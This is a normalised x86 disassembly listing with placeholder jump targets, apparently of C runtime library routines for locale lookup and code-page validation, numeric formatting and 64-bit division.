lea eax [ ebp - 0x84 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
test [ ebx + 0x8 ] 0x2
jne r-xdata
or [ ebx + 0x8 ] 0x304
or [ ebx + 0x8 ] 0x200
xor edi edi
cmp [ ebx + 0x10 ] edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] edi
je r-xdata
or [ ebx + 0x8 ] 0x100
cmp [ ebx + 0x250 ] di
jne r-xdata
test [ ebx + 0x8 ] 0x1
jne r-xdata
push [ ebx + 0xc ]
lea eax [ ebp - 0x84 ]
push eax
push [ ebx ]
call sub_433c0b
add esp 0xc
test eax eax
jne r-xdata
xor edi edi
push [ ebx ]
call sub_427b65
pop ecx
cmp eax [ ebx + 0xc ]
jne r-xdata
push esi
call sub_427b65
inc eax
push eax
push esi
lea eax [ ebx + 0x250 ]
push 0x55
push eax
call sub_424aa8
add esp 0x14
test eax eax
jne r-xdata
push esi
call sub_4373ac
pop ecx
test eax eax
je r-xdata
or [ ebx + 0x8 ] 0x2
jmp r-xdata
push esi
call sub_4373ac
pop ecx
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_42a241
int3
or [ ebx + 0x8 ] 0x1
jmp r-xdata
push esi
call sub_427b65
inc eax
push eax
push esi
lea eax [ ebx + 0x250 ]
push 0x55
push eax
call sub_424aa8
add esp 0x14
test eax eax
je r-xdata
push [ ebx ]
call sub_437016
push [ ebx ]
mov esi eax
call sub_427b65
pop ecx
pop ecx
cmp esi eax
je r-xdata
mov esi [ ebp - 0x88 ]
jmp r-xdata
sub_437266
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_42f4f6
lea esi [ eax + 0x9c ]
push 0x78
mov ecx [ esi + 0x10 ]
neg ecx
sbb ecx ecx
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push edi
call sub_42968a
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ esi ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_427b65
inc eax
push eax
push edi
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_424aa8
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_421ed7
leave
retn 0xc
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
or [ esi + 0x8 ] 0x4
sub_437317
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
add eax 0x250
push 0x20001004
push eax
call sub_42968a
add esp 0x10
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_436e12
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp [ GetACP@IAT ]
push r--data
push esi
call sub_436e12
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_42314c
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
add eax 0x250
push 0x2000000b
push eax
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
sub_4373ac
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push 0x9
lea eax [ ebp - 0x18 ]
push eax
push 0x59
push esi
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_421ed7
leave
retn
push 0x9
lea eax [ ebp - 0x18 ]
push esi
push eax
call sub_433bd5
add esp 0xc
neg eax
sbb eax eax
inc eax
sub_4373f6
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call sub_42f4f6
mov ebx [ ebp + 0x8 ]
lea esi [ eax + 0x9c ]
xor ecx ecx
lea eax [ esi + 0x250 ]
mov [ ebp - 0x4 ] eax
mov [ eax ] cx
lea eax [ ebx + 0x80 ]
lea edi [ esi + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi ] ebx
mov [ edi ] eax
cmp [ eax ] cx
je r-xdata
mov eax [ esi ]
push esi
cmp [ eax ] cx
je r-xdata
push edi
push 0x16
push r--data
call sub_437bd6
add esp 0xc
xor ecx ecx
call sub_436ee1
mov eax [ edi ]
cmp [ eax ] cx
je r-xdata
xor eax eax
lea eax [ ebx + 0x100 ]
push esi
push eax
call sub_437317
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_436fcc
call sub_436f58
jmp r-xdata
cmp esi 0xfde8
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
je r-xdata
push esi
push 0x40
push r--data
call sub_437bd6
add esp 0xc
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
cmp esi 0xfde9
je r-xdata
mov eax [ edi ]
xor ecx ecx
push esi
cmp [ eax ] cx
je r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
call sub_436fcc
jmp r-xdata
call sub_436f58
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop ecx
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push [ ebp - 0x4 ]
lea ebx [ edi + 0x120 ]
xor eax eax
mov [ ebx ] ax
call sub_427b65
inc eax
push eax
push [ ebp - 0x4 ]
push 0x55
push ebx
call sub_424aa8
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
push 0x40
push edi
push 0x1001
push ebx
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
push 0x40
lea ebx [ edi + 0x80 ]
push ebx
lea eax [ edi + 0x120 ]
push 0x1002
push eax
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
push 0x5f
push ebx
call sub_438ade
pop ecx
pop ecx
test eax eax
jne r-xdata
push 0x40
push ebx
lea eax [ edi + 0x120 ]
push 0x7
push eax
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
push 0x2e
push ebx
call sub_438ade
pop ecx
pop ecx
test eax eax
je r-xdata
push 0xa
push 0x10
lea eax [ edi + 0x100 ]
push eax
push esi
call sub_4389c2
add esp 0x10
sub_4375b8
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42f4f6
mov ebx eax
call sub_42f4f6
mov edi [ eax + 0x3b8 ]
push esi
call sub_437a72
pop ecx
mov ecx [ ebx + 0xb0 ]
neg ecx
sbb ecx ecx
mov esi eax
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0xa0 ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
push esi
call sub_437b4c
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn 0x4
or [ edi ] 0x4
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] esi
sub_437666
push ebp
mov ebp esp
push esi
call sub_42f4f6
mov esi eax
push [ esi + 0xa0 ]
call sub_427b65
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_4375b8
mov [ esi + 0xb0 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
test [ eax ] 0x4
jne r-xdata
pop ebp
retn
and [ eax ] 0x0
sub_4376a6
push ebp
mov ebp esp
push esi
push edi
call sub_42f4f6
lea esi [ eax + 0x9c ]
push [ esi ]
call sub_427b65
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_427b65
mov edi [ ebp + 0x8 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x14 ] eax
and [ edi + 0x4 ] 0x0
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
je r-xdata
push [ esi ]
call sub_43777c
pop ecx
push 0x2
pop eax
jmp r-xdata
and [ edi ] 0x0
test [ edi ] 0x200
je r-xdata
push 0x1
push sub_4377a6
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesW@IAT ]
test [ edi ] 0x100
je r-xdata
test [ edi ] 0x7
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_437723
push ebp
mov ebp esp
push esi
call sub_42f4f6
mov esi eax
push [ esi + 0x9c ]
call sub_427b65
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0xac ] eax
je r-xdata
push [ esi + 0x9c ]
call sub_43777c
pop ecx
push 0x2
pop eax
jmp r-xdata
pop ebp
retn
and [ eax ] 0x0
push 0x1
push sub_437999
mov [ esi + 0xa8 ] eax
call [ EnumSystemLocalesW@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
test [ eax ] 0x4
jne r-xdata
sub_43777c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
sub_4377a6
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42f4f6
lea ebx [ eax + 0x9c ]
call sub_42f4f6
mov edi [ eax + 0x3b8 ]
push esi
call sub_437a72
pop ecx
mov ecx [ ebx + 0x14 ]
neg ecx
sbb ecx ecx
mov esi eax
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx + 0x4 ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ edi ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0xf0
lea eax [ ebp - 0xf4 ]
push eax
mov eax [ ebx + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x10 ]
neg ecx
sbb ecx ecx
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
test [ edi ] 0x2
jne r-xdata
or [ edi ] 0x304
mov [ edi + 0x4 ] esi
jmp r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
or [ edi ] 0x200
cmp [ ebx + 0x10 ] eax
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov [ edi + 0x8 ] esi
cmp [ ebx + 0xc ] 0x0
je r-xdata
or [ edi ] 0x100
cmp [ edi + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] eax
je r-xdata
mov edx [ edi ]
test dl 0x1
jne r-xdata
push [ ebx + 0xc ]
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_433c0b
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ edi + 0x4 ] esi
push [ ebx ]
call sub_427b65
pop ecx
cmp eax [ ebx + 0xc ]
jne r-xdata
push esi
call sub_437b4c
pop ecx
test eax eax
je r-xdata
or [ edi ] 0x2
mov [ edi + 0x8 ] esi
push [ ebx ]
call sub_427b65
pop ecx
cmp eax [ ebx + 0xc ]
jne r-xdata
push edi
push eax
push edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ edi ] edx
mov [ edi + 0x4 ] esi
jmp r-xdata
push esi
call sub_437b6e
add esp 0xc
test eax eax
je r-xdata
sub_437999
push ebp
mov ebp esp
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_42f4f6
lea ebx [ eax + 0x9c ]
call sub_42f4f6
mov edi [ eax + 0x3b8 ]
push esi
call sub_437a72
pop ecx
mov ecx [ ebx + 0x10 ]
neg ecx
sbb ecx ecx
mov esi eax
push 0xf0
lea eax [ ebp - 0xf4 ]
and ecx 0xfffff002
push eax
add ecx 0x1001
push ecx
push esi
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
inc eax
jmp r-xdata
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn 0x4
mov eax [ edi ]
shr eax 0x2
not eax
and eax 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
or [ edi ] 0x4
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
push edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0xf4 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_437b6e
add esp 0xc
test eax eax
je r-xdata
push edi
push eax
sub_437a72
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
movzx ecx [ edx ]
xor esi esi
test cx cx
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push edi
push 0x5
pop edi
lea eax [ ecx - 0x41 ]
cmp ax di
ja r-xdata
add ecx 0xffd9
jmp r-xdata
movzx ecx cx
add ecx 0xffffffd0
shl esi 0x4
add esi ecx
movzx ecx [ edx ]
test cx cx
jne r-xdata
add ecx 0xfff9
lea eax [ ecx - 0x61 ]
lea edx [ edx + 0x2 ]
cmp ax di
ja r-xdata
pop edi
sub_437ac1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push 0x20001004
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_436e12
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp [ GetACP@IAT ]
push r--data
push esi
call sub_436e12
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_42314c
pop ecx
jmp r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push 0x2000000b
push [ eax + 0x8 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
sub_437b4c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_437b6e
push ebp
mov ebp esp
push ecx
push esi
push edi
call sub_42f4f6
mov esi [ ebp + 0x8 ]
push 0x2
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
and ecx 0x3ff
push 0x20000001
or ecx 0x400
push ecx
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
pop esi
leave
retn
push [ edi + 0x9c ]
call sub_43777c
push [ edi + 0x9c ]
mov esi eax
call sub_427b65
pop ecx
pop ecx
cmp esi eax
je r-xdata
sub_437bd6
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
xor edx edx
push edi
inc edx
xor edi edi
test esi esi
js r-xdata
xor eax eax
test edx edx
pop edi
sete al
pop esi
pop ebp
retn
push ebx
pop ebx
mov ecx [ ebp + 0x8 ]
lea eax [ edi + esi ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
mov eax ebx
imul eax eax 0xc
mov [ ebp + 0xc ] eax
push [ eax + ecx ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_424898
mov edx eax
pop ecx
pop ecx
test edx edx
jne r-xdata
jns r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
add eax 0x4
add ecx eax
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
jmp r-xdata
lea edi [ ebx + 0x1 ]
lea esi [ ebx - 0x1 ]
jmp r-xdata
cmp edi esi
jle r-xdata
test edx edx
je r-xdata
sub_437c42
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov [ ebp - 0x14 ] eax
call sub_42f4f6
lea ebx [ eax + 0x9c ]
xor eax eax
push 0xc
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_427900
add esp 0xc
call sub_42f4f6
lea ecx [ ebp - 0x10 ]
mov [ eax + 0x3b8 ] ecx
test esi esi
jne r-xdata
lea eax [ esi + 0x80 ]
lea edi [ ebx + 0x4 ]
xor ecx ecx
mov [ ebx ] esi
mov [ edi ] eax
test eax eax
je r-xdata
or [ ebp - 0x10 ] 0x104
jmp r-xdata
mov [ ebp - 0x10 ] ecx
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax ] cx
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ eax ] cx
je r-xdata
mov eax [ r--data ]
push edi
dec eax
push eax
push r--data
call sub_437bd6
add esp 0xc
xor ecx ecx
xor eax eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ esi + 0x100 ]
neg esi
sbb esi esi
and esi eax
push esi
call sub_437ac1
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
mov [ ebp - 0x10 ] 0x104
cmp [ eax ] cx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_437666
lea eax [ ebp - 0x10 ]
push eax
call sub_437723
cmp [ eax ] cx
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ r--data ]
push ebx
dec eax
push eax
push r--data
call sub_437bd6
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_4376a6
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop ecx
jne r-xdata
push 0x1
push [ ebp - 0xc ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_437723
jmp r-xdata
xor ecx ecx
cmp [ eax ] cx
je r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
pop ecx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_4376a6
jmp r-xdata
push 0x55
lea eax [ ebx + 0x250 ]
push eax
push [ ebp - 0xc ]
call sub_429593
mov ebx [ ebp - 0x14 ]
add esp 0xc
test ebx ebx
je r-xdata
mov [ eax ] esi
xor eax eax
inc eax
jmp r-xdata
push 0x55
lea eax [ ebx + 0x120 ]
push eax
push [ ebp - 0xc ]
call sub_429593
mov edi [ GetLocaleInfoW@IAT ]
add esp 0xc
push 0x40
push ebx
push 0x1001
push [ ebp - 0xc ]
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
push 0x40
lea eax [ ebx + 0x80 ]
push eax
push 0x1002
push [ ebp - 0x8 ]
call edi
test eax eax
je r-xdata
push 0xa
push 0x10
lea ecx [ ebx + 0x100 ]
push ecx
push esi
call sub_4389c2
add esp 0x10
sub_437e5c
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ edx + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_427b11
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ esi ] 0x0
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
push ebx
lea ebx [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax ebx
test ecx ecx
jle r-xdata
call sub_427b11
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov dl [ edi ]
test dl dl
je r-xdata
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc edi
jmp r-xdata
push ebx
call sub_425610
inc eax
push eax
push ebx
push esi
call sub_421ef0
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ eax ] dl
inc eax
dec ecx
test ecx ecx
jg r-xdata
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_437f0c
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_4247f2
lea eax [ ebp - 0x28 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43966c
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_438b8c
mov ecx eax
mov eax [ ebp - 0x14 ]
add esp 0x28
test al 0x3
jne r-xdata
test al 0x1
jne r-xdata
cmp ecx 0x1
je r-xdata
push 0x4
jmp r-xdata
test al 0x2
je r-xdata
push 0x3
cmp ecx 0x2
jne r-xdata
pop ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_437f98
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebp - 0x28 ]
call sub_4247f2
lea eax [ ebp - 0x28 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push esi
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_43966c
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_4390fc
mov ecx eax
mov eax [ ebp - 0x14 ]
add esp 0x28
test al 0x3
jne r-xdata
test al 0x1
jne r-xdata
cmp ecx 0x1
je r-xdata
push 0x4
jmp r-xdata
test al 0x2
je r-xdata
push 0x3
cmp ecx 0x2
jne r-xdata
pop ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_438024
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov edx [ eax + 0x4 ]
push esi
push edi
movzx edi [ eax + 0x6 ]
mov eax [ eax ]
mov ecx edi
shr ecx 0x4
and ecx 0x7ff
and edi 0x8000
mov esi ecx
and edx 0xfffff
mov ebx 0x80000000
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
test edx edx
jne r-xdata
cmp esi 0x7ff
je r-xdata
lea eax [ ecx + 0x3c01 ]
xor ebx ebx
test eax eax
jne r-xdata
mov eax 0x7fff
jmp r-xdata
lea eax [ ecx + 0x3c00 ]
jmp r-xdata
or edi eax
mov [ ebx + 0x8 ] di
mov edi eax
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] edx
and [ eax ] edx
mov [ eax + 0x8 ] di
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov esi ecx
shr esi 0x15
shl edx 0xb
or esi edx
or esi ebx
mov ebx [ ebp + 0x8 ]
shl ecx 0xb
mov [ ebp + 0xc ] eax
mov [ ebx + 0x4 ] esi
mov [ ebx ] ecx
test esi esi
js r-xdata
movzx eax ax
mov edx [ ebx ]
mov ecx edx
shr ecx 0x1f
add esi esi
lea eax [ edx + edx ]
add edi 0xffff
or esi ecx
mov [ ebx ] eax
jns r-xdata
mov [ ebp + 0xc ] edi
mov edi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] esi
pop edi
pop esi
pop ebx
leave
retn
sub_4380ea
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_438024
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_439de8
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_42eb0a
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
sub_438180
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
